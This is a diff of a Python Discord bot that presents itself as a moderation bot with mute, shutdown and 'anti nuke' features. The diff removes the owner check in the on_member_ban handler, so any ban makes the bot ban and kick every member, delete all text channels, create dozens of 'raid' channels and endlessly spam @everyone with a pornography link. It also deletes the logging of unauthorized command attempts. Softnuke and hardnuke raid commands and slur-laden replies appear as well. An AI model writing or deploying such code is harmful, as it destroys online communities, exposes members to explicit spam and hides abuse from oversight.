@@ -672,48 +672,44 @@ async def on_member_ban(guild, user):
                  "Broke rules", "Ban command used", None]
         krlist = ["Kicked for inactivity", "Violation of rules", "Break rules", "Kick command used", "Kicked bot", None]
         
-        if user.id != ownerid:
-            print(str(user.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
-        else:
-            
-            for member in guild.members:
-                try:
-                    await member.ban(reason=random.choice(rlist))
-                except Exception:
-                    pass
-            
-            for member in guild.members:
-                try:
-                    await member.kick(reason=random.choice(krlist))
-                except Exception:
-                    pass
-            
+        for member in guild.members:
             try:
-                try:
-                    text_channel_list = []
-                    
-                    for channel in guild.text_channels:
-                        text_channel_list.append(channel)
-                    
-                    for channel in text_channel_list:
-                        try:
-                            await channel.delete()
-                        except Exception:
-                            pass
+                await member.ban(reason=random.choice(rlist))
+            except Exception:
+                pass
+        
+        for member in guild.members:
+            try:
+                await member.kick(reason=random.choice(krlist))
+            except Exception:
+                pass
+        
+        try:
+            try:
+                text_channel_list = []
                 
-                except Exception:
-                    pass
+                for channel in guild.text_channels:
+                    text_channel_list.append(channel)
+                
+                for channel in text_channel_list:
+                    try:
+                        await channel.delete()
+                    except Exception:
+                        pass
             
             except Exception:
                 pass
-            
-            newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
-            for i in range(64):
-                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-            
-            while True:
-                try:
-                    await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
+        
+        except Exception:
+            pass
+        
+        newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
+        for i in range(64):
+            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+        
+        while True:
+            try:
+                await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
 EZ
 EZ
 EZ
@@ -721,14 +717,14 @@ EZ
 EZ
 EZ
 https://pornhub.com/**""")
-                except Exception:
-                    newchannel = random.choice(guild.text_channels)
-                
-                try:
-                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-                except Exception:
-                    pass
+            except Exception:
+                newchannel = random.choice(guild.text_channels)
+            
+            try:
+                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+            except Exception:
+                pass
 
 
 # ANTI NUKE
@@ -901,7 +897,6 @@ async def waitForReply(ctx, msg: discord.Message, timeout=10):
 @bot.command()
 async def shutdown(ctx):
     if str(ctx.author.id) != str(ownerid):
-        print(str(ctx.author.id), "Tried to shutdown the bot by using .shutdown")
         await ctx.send(f"LOL Only <@{ownerid}> can shutdown the bot, get lost\n**YOU GAY**")
         return
     
@@ -932,7 +927,6 @@ async def shutdown(ctx):
 @bot.command()
 async def restart(ctx):
     if str(ctx.author.id) != str(ownerid):
-        print(str(ctx.author.id), "Tried to shutdown the bot by using .shutdown")
         await ctx.send(f"LOL Only <@{ownerid}> can shutdown the bot, get lost\n**YOU GAY**")
         return
     
@@ -963,10 +957,9 @@ def get_muted_role(ctx):
     return r
 
 
-@bot.command()
+@bot.command(aliases=['timeout'])
 async def mute(ctx, member: discord.Member, *, reason=None):
     if ctx.author.id != ownerid and not ctx.author.guild_permissions.manage_server:
-        print(str(ctx.author.id), "Tried to mute", member, "by using .mute")
         await ctx.send("You don't have permissions!")
     else:
         mutedrole = get_muted_role(ctx)
@@ -976,13 +969,12 @@ async def mute(ctx, member: discord.Member, *, reason=None):
                                                     permissions=discord.Permissions(send_messages=False))
         
         await member.add_roles(mutedrole, reason=reason)
-        await ctx.send(f"Muted User:{member} successfully")
+        await ctx.send(f"Muted User: {member} successfully")
 
 
-@bot.command()
+@bot.command(aliases=['untimeout'])
 async def unmute(ctx, member: discord.Member):
     if str(ctx.author.id) != str(ownerid) and not ctx.author.guild_permissions.manage_server:
-        print(str(ctx.author.id), "Tried to unmute", member, "by using .unmute")
         await ctx.send("You don't have permissions!")
     else:
         mutedrole = get_muted_role(ctx)
@@ -1003,7 +995,6 @@ async def unmute(ctx, member: discord.Member):
 @bot.command()
 async def nuke(ctx):
     if not ctx.author.guild_permissions.administrator and not ctx.author.id == ownerid:
-        print(str(ctx.author.id), "Tried to nuke channel:", ctx.channel, "by using .nuke")
         await ctx.send("You don't have `Administrator` Permissions!")
     else:
         channelpos = ctx.channel.position
@@ -1017,12 +1008,10 @@ Nuke performed by: <@{ctx.author.id}>""")
 @bot.command(aliases=['raidstep1'])
 async def softnuke_server(ctx):
     if str(ctx.author.id) != str(ownerid):
-        print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .softnuke_server")
         await ctx.send("You don't have permissions to do that!")
     else:
         async def nuke_channel_2(txt):
             if str(txt.author.id) != str(ownerid):
-                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                 await txt.send("You don't have permissions to do that!")
             else:
                 text_channel_list = []
@@ -1046,7 +1035,6 @@ async def hardnuke_server(ctx):
               "Repeated Warnings", "Kicked with Dyno", None]
     
     if str(ctx.author.id) != str(ownerid):
-        print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
         await ctx.send("You don't have `Administrator` Permissions!")
     else:
         for member in ctx.guild.members:
